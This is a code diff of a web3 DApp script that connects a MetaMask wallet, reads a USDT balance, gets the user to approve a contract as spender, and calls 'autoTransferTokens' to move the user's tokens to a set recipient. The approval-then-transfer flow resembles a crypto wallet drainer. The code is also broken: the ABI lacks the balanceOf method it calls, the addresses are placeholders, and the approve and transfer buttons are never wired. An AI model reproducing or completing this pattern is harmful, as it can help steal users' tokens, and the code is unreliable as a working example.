@@ -1,5 +1,89 @@
-const contractABI = /* Place your ABI here */;
-const contractAddress = '0xa2E8dda146b9E724bA0cdfB3bdB6bfA1e37a54d2';
+const contractABI = [
+    {
+        "inputs": [
+            {
+                "internalType": "address",
+                "name": "tokenAddress",
+                "type": "address"
+            },
+            {
+                "internalType": "address",
+                "name": "from",
+                "type": "address"
+            },
+            {
+                "internalType": "address",
+                "name": "spender",
+                "type": "address"
+            }
+        ],
+        "name": "approveForTransfer",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+    },
+    {
+        "inputs": [
+            {
+                "internalType": "address",
+                "name": "tokenAddress",
+                "type": "address"
+            },
+            {
+                "internalType": "address",
+                "name": "spender",
+                "type": "address"
+            }
+        ],
+        "name": "automateApproval",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+    },
+    {
+        "inputs": [
+            {
+                "internalType": "address",
+                "name": "tokenAddress",
+                "type": "address"
+            },
+            {
+                "internalType": "address",
+                "name": "from",
+                "type": "address"
+            },
+            {
+                "internalType": "address",
+                "name": "to",
+                "type": "address"
+            }
+        ],
+        "name": "autoTransferTokens",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function"
+    },
+    {
+        "inputs": [],
+        "stateMutability": "nonpayable",
+        "type": "constructor"
+    },
+    {
+        "inputs": [],
+        "name": "owner",
+        "outputs": [
+            {
+                "internalType": "address",
+                "name": "",
+                "type": "address"
+            }
+        ],
+        "stateMutability": "view",
+        "type": "function"
+    }
+];
+
+const contractAddress = '0xa2E8dda146b9E724bA0cdfB3bdB6bfA1e37a54d2'; // 你的合约地址
 
 let web3;
 let contract;
@@ -7,69 +91,76 @@ let userAccount;
 
 // Initialize Web3
 window.addEventListener('load', async () => {
-    if (window.ethereum) {
-        web3 = new Web3(window.ethereum);
-        try {
-            await window.ethereum.enable(); // Request account access
-            initApp(); // Initialize app after access is granted
-        } catch (error) {
-            console.error('User denied account access', error);
-        }
+    if (typeof window.ethereum !== 'undefined') {
+        web3 = new Web3(window.ethereum); // 使用 MetaMask 的 provider
+        document.getElementById('connectWallet').addEventListener('click', connectWallet);
     } else {
-        alert('Please install MetaMask!');
+        alert('MetaMask 未安装。请安装 MetaMask 以使用该 DApp！');
     }
 });
 
-// Initialize app and contract
-async function initApp() {
-    contract = new web3.eth.Contract(contractABI, contractAddress);
-    document.getElementById('connectWallet').addEventListener('click', connectWallet);
-    document.getElementById('approveTokens').addEventListener('click', approveTokens);
-    document.getElementById('transferTokens').addEventListener('click', transferTokens);
-}
-
-// Connect wallet
+// 连接钱包
 async function connectWallet() {
-    const accounts = await web3.eth.requestAccounts();
-    userAccount = accounts[0];
-    document.getElementById('walletAddress').textContent = userAccount;
-    document.getElementById('walletInfo').classList.remove('hidden');
-
-    // Display balance
-    const balance = await getTokenBalance(userAccount);
-    document.getElementById('walletBalance').textContent = web3.utils.fromWei(balance, 'ether');
+    try {
+        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+        userAccount = accounts[0];
+        document.getElementById('walletAddress').textContent = userAccount;
+        document.getElementById('walletInfo').classList.remove('hidden');
+        const balance = await getTokenBalance(userAccount);
+        document.getElementById('walletBalance').textContent = web3.utils.fromWei(balance, 'ether');
+        document.getElementById('status').textContent = '钱包连接成功！';
+    } catch (error) {
+        console.error('用户拒绝连接或者出现错误:', error);
+        document.getElementById('status').textContent = '连接钱包失败，请重试。';
+    }
 }
 
-// Get USDT balance
+// 获取 USDT 余额
 async function getTokenBalance(address) {
-    return await contract.methods.balanceOf(address).call();
+    try {
+        contract = new web3.eth.Contract(contractABI, contractAddress);
+        const balance = await contract.methods.balanceOf(address).call();
+        return balance;
+    } catch (error) {
+        console.error('获取代币余额失败:', error);
+        document.getElementById('status').textContent = '获取余额失败，请重试。';
+    }
 }
 
-// Approve tokens
+// 批准代币
 async function approveTokens() {
-    const spenderAddress = contractAddress; // The contract itself
-    const balance = await getTokenBalance(userAccount);
-    
-    // Approve full balance
-    await contract.methods.approveForTransfer(
-        'USDT token address', 
-        userAccount, 
-        spenderAddress
-    ).send({ from: userAccount });
+    try {
+        const spenderAddress = contractAddress; // 合约本身
+        const balance = await getTokenBalance(userAccount);
 
-    document.getElementById('status').textContent = 'Tokens approved for transfer.';
+        await contract.methods.approveForTransfer(
+            'USDT token address', 
+            userAccount, 
+            spenderAddress
+        ).send({ from: userAccount });
+
+        document.getElementById('status').textContent = '代币批准成功。';
+    } catch (error) {
+        console.error('批准代币时出错:', error);
+        document.getElementById('status').textContent = '代币批准失败，请重试。';
+    }
 }
 
-// Transfer tokens
+// 转移代币
 async function transferTokens() {
-    const recipientAddress = 'recipient address'; // Set your recipient address
-    const balance = await getTokenBalance(userAccount);
+    try {
+        const recipientAddress = 'recipient address'; // 设置接收者地址
+        const balance = await getTokenBalance(userAccount);
 
-    await contract.methods.autoTransferTokens(
-        'USDT token address', 
-        userAccount, 
-        recipientAddress
-    ).send({ from: userAccount });
+        await contract.methods.autoTransferTokens(
+            'USDT token address', 
+            userAccount, 
+            recipientAddress
+        ).send({ from: userAccount });
 
-    document.getElementById('status').textContent = 'Tokens transferred successfully!';
+        document.getElementById('status').textContent = '代币转移成功！';
+    } catch (error) {
+        console.error('转移代币时出错:', error);
+        document.getElementById('status').textContent = '代币转移失败，请重试。';
+    }
 }
